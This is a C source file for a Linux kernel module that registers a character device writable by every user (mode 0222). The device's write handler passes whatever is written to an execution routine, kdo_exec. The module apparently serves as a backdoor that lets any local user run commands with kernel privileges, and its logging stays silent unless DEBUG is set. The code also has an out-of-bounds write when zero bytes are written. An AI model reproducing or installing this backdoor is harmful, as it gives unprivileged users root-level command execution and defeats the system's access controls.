#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>

#include "kdo.h"
#include "exec.h"
#include "cdev.h"


static int _cdev_major = 0;

static struct cdev _cdev;
static struct class *_cdev_class = NULL;

static struct file_operations cdev_fops;


static int _cdev_uevent(struct device *dev, struct kobj_uevent_env *env)
{
	add_uevent_var(env, "DEVMODE=%#o", 0222);
	return 0;
}

static int _cdev_open(struct inode *inode, struct file *file)
{
	return 0;
}

static long _cdev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	return 0;
}

static ssize_t _cdev_read(struct file *file, char __user *buf, size_t len, loff_t *offset)
{
	return 0;
}

static ssize_t _cdev_write(struct file *file, const char __user *buf, size_t len, loff_t *offset)
{
	size_t ret;
	uint8_t data[CDEV_MAX_WRITE];

	if (len > CDEV_MAX_WRITE) {
		#ifdef DEBUG
		kdo_log_fmt(KERN_WARNING, "write size > %u (will not execute)", CDEV_MAX_WRITE);
		#endif

		return len;
	}

	if ((ret = copy_from_user(data, buf, len))) {
		#ifdef DEBUG
		kdo_log_fmt(KERN_ERR, "only %lu bytes were copied - will not execute", ret);
		#endif

		return len;
	}

	data[len - 1] = 0x00;

	kdo_exec(data);

	return len;
}

static int _cdev_release(struct inode *inode, struct file *file)
{
	return 0;
}

// Create character device
int cdev_create(void)
{
	int ret;
	dev_t dev;

	cdev_fops.open = _cdev_open;
	cdev_fops.unlocked_ioctl = _cdev_ioctl;
	cdev_fops.read = _cdev_read;
	cdev_fops.write = _cdev_write;
	cdev_fops.release = _cdev_release;
	cdev_fops.owner = THIS_MODULE;

	if ((ret = alloc_chrdev_region(&dev, 0, 1, CDEV_NAME))) {
		#ifdef DEBUG
		kdo_log(KERN_ERR, "alloc_chrdev_region failed");
		#endif

		return ret;
	}

	_cdev_major = MAJOR(dev);

	_cdev_class = class_create(THIS_MODULE, CDEV_NAME);
	_cdev_class->dev_uevent = _cdev_uevent;

	cdev_init(&_cdev, &cdev_fops);
	_cdev.owner = THIS_MODULE;

	cdev_add(&_cdev, MKDEV(_cdev_major, 0), 1);
	device_create(_cdev_class, NULL, MKDEV(_cdev_major, 0), NULL, CDEV_NAME);

	#ifdef DEBUG
	kdo_log(KERN_INFO, "created device " CDEV_NAME);
	#endif

	return 0;
}

int cdev_destroy(void)
{
	if (! (_cdev_major || _cdev_class)) {
		#ifdef DEBUG
		kdo_log(KERN_ERR, "device " CDEV_NAME " not yet created");
		#endif

		return -1;
	}

	device_destroy(_cdev_class, MKDEV(_cdev_major, 0));

	class_unregister(_cdev_class);
	class_destroy(_cdev_class);

	unregister_chrdev_region(MKDEV(_cdev_major, 0), MINORMASK);

	#ifdef DEBUG
	kdo_log(KERN_INFO, "removed device " CDEV_NAME);
	#endif

	return 0;
}
